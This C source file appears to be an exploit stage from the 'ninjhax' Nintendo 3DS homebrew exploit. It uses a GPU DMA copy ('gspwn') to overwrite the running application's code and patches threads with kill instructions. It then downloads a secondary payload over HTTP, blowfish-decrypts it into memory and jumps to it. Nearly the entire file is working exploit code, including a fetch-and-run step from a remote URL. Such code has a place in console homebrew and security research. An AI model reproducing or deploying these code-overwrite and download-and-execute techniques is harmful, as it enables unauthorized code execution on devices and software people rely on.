#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include "text.h"

#include "../../../../build/constants.h"

#define TOPFBADR1 ((u8*)CN_TOPFBADR1)
#define TOPFBADR2 ((u8*)CN_TOPFBADR2)

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

//?
Result HTTPC_Initialize(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x10044; //request header code
	cmdbuf[1]=0x1000; //unk
	cmdbuf[2]=0x20; //unk
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_CreateContext(Handle handle, char* url, Handle* contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	u32 l=_strlen(url)+1;

	cmdbuf[0]=0x20082; //request header code
	cmdbuf[1]=l;
	cmdbuf[2]=0x01; //unk
	cmdbuf[3]=(l<<4)|0xA;
	cmdbuf[4]=(u32)url;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
	
	if(contextHandle)*contextHandle=cmdbuf[2];

	return cmdbuf[1];
}

Result HTTPC_InitializeConnectionSession(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x80042; //request header code
	cmdbuf[1]=contextHandle;
	cmdbuf[2]=0x20; //unk, fixed to that in code
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_SetProxyDefault(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0xe0040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_CloseContext(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x30040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_BeginRequest(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x90040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_ReceiveData(Handle handle, Handle contextHandle, u8* buffer, u32 size)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0xB0082; //request header code
	cmdbuf[1]=contextHandle;
	cmdbuf[2]=size;
	cmdbuf[3]=(size<<4)|12;
	cmdbuf[4]=(u32)buffer;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_GetDownloadSizeState(Handle handle, Handle contextHandle, u32* totalSize)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x00060040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	if(totalSize)*totalSize=cmdbuf[3];

	return cmdbuf[1];
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

// const u8 hexTable[]=
// {
// 	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
// };

// void hex2str(char* out, u32 val)
// {
// 	int i;
// 	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
// 	out[8]=0x00;
// }

// void drawHex(u32 val, int x, int y)
// {
// 	char str[9];

// 	hex2str(str,val);
// 	drawString(TOPFBADR1,str,x,y);
// 	drawString(TOPFBADR2,str,x,y);
// }

void doGspwn(u32* src, u32* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

Result _GSPGPU_InvalidateDataCache(Handle* handle, Handle kprocess, u32* addr, u32 size)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x00090082;
	cmdbuf[1]=(u32)addr;
	cmdbuf[2]=size;
	cmdbuf[3]=0x00000000;
	cmdbuf[4]=(u32)kprocess;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

void patchMem(Handle* gspHandle, u32 dst, u32 size, u32 start, u32 end)
{
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

	int i;
	_GSPGPU_InvalidateDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x200);
	doGspwn((u32*)(dst), (u32*)(0x14100000), 0x200);
	svc_sleepThread(0x100000);
	for(i=start;i<end;i++)((u32*)0x14100000)[i]=0xEF000009;
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x200);
	doGspwn((u32*)(0x14100000), (u32*)(dst), 0x200);
	svc_sleepThread(0x100000);
}

u32 computeCodeAddress(u32 offset)
{
	return CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+FIRM_APPMEMALLOC+offset;
}

int _main()
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

	for(int i=0; i<0x46500*2;i++)((u8*)CN_TOPFBADR1)[i]=0x00;
	// drawString(TOPFBADR1,"ninjhaxx",0,0);
	// drawString(TOPFBADR2,"ninjhaxx",0,0);

	Handle* srvHandle=(Handle*)CN_SRVHANDLE_ADR;

	int line=10;
	Result ret;

	Handle* addressArbiterHandle=(Handle*)0x003414B0;

	Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002C3A78;
	Handle** dspHandle=(Handle**)0x341A4C;

	_DSP_UnloadComponent(*dspHandle);

	//close threads
		//patch gsp event handler addr to kill gsp thread ASAP
		*((u32*)(0x362DA8+0x10+4*0x4))=0x002B5D14; //svc 0x9 addr

		//patch waitSyncN
		patchMem(gspHandle, computeCodeAddress(0x0019BD00), 0x200, 0xB, 0x41);
		patchMem(gspHandle, computeCodeAddress(0x0019C000), 0x200, 0x39, 0x45);
		patchMem(gspHandle, computeCodeAddress(0x001D3700), 0x200, 0x7, 0x1A);
		// patchMem(gspHandle, computeCodeAddress(0x000C9100), 0x200, 0x2E, 0x44);
		// patchMem(gspHandle, computeCodeAddress(0x000EFE00), 0x200, 0x2C, 0x31);

		//patch arbitrateAddress
		patchMem(gspHandle, computeCodeAddress(0x001D3300), 0x200, 0x10, 0x3C);

		//wake threads
		svc_arbitrateAddress(*addressArbiterHandle, 0x364ccc, 0, -1, 0);
		svc_signalEvent(((Handle*)0x354ba8)[2]);
		s32 out; svc_releaseSemaphore(&out, *(Handle*)0x341AB0, 1); //CHECK !

		//kill thread5 without panicking the kernel...
		*(u8*)(0x3664D8+0xd)=0x00;

	svc_sleepThread(0x10000000);

	Handle httpcHandle;
	ret=_srv_getServiceHandle(srvHandle, &httpcHandle, "http:C");

	// drawHex(ret,0,line+=10);
	// drawHex(httpcHandle,0,line+=10);

	Handle httpContextHandle=0x00;

	ret=HTTPC_Initialize(httpcHandle);

	// drawHex(ret,0,line+=10);

	ret=HTTPC_CreateContext(httpcHandle, CN_NINJHAX_URL FIRM_VERSION "_" CN_VERSION "_" SPIDER_VERSION "_" RO_VERSION ".bin", &httpContextHandle);

	// drawHex(ret,0,line+=10);
	
	Handle httpcHandle2;
	ret=_srv_getServiceHandle(srvHandle, &httpcHandle2, "http:C");

	ret=HTTPC_InitializeConnectionSession(httpcHandle2, httpContextHandle);
	ret=HTTPC_SetProxyDefault(httpcHandle2, httpContextHandle);

	// drawHex(ret,0,line+=10);

	ret=HTTPC_BeginRequest(httpcHandle2, httpContextHandle);

	// drawHex(ret,0,line+=10);

	u8* buffer0=(u8*)0x14300000;
	u8* buffer1=(u8*)0x14100000;
	u32 secondaryPayloadSize=0x0;
	ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer0, 0x300000);
	ret=HTTPC_GetDownloadSizeState(httpcHandle2, httpContextHandle, &secondaryPayloadSize);

	// drawHex(ret,0,line+=10);

	HTTPC_CloseContext(httpcHandle2, httpContextHandle);

	//TODO : modify key/parray first ?
	//(use some of its slots as variables in ROP to confuse people ?)
	//decrypt secondary payload
	Result (*blowfishKeyScheduler)(u32* dst)=(void*)0x001A5900;
	Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A5F48;

	blowfishKeyScheduler((u32*)0x14200000);
	blowfishDecrypt((u32*)0x14200000, (u32*)buffer0, (u32*)buffer1, secondaryPayloadSize);

	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)buffer1, 0x300000);
	// drawHex(ret,0,line+=10);

	doGspwn((u32*)(buffer1), (u32*)computeCodeAddress(CN_3DSX_LOADADR-0x00100000), 0x0000A000);

	svc_sleepThread(0x3B9ACA00);

	// drawString(TOPFBADR1,"ninjhax2",100,0);
	// drawString(TOPFBADR2,"ninjhax2",100,0);

	void (*reset)(u32 size)=(void*)CN_3DSX_LOADADR;
	reset(secondaryPayloadSize);

	return 0;
}
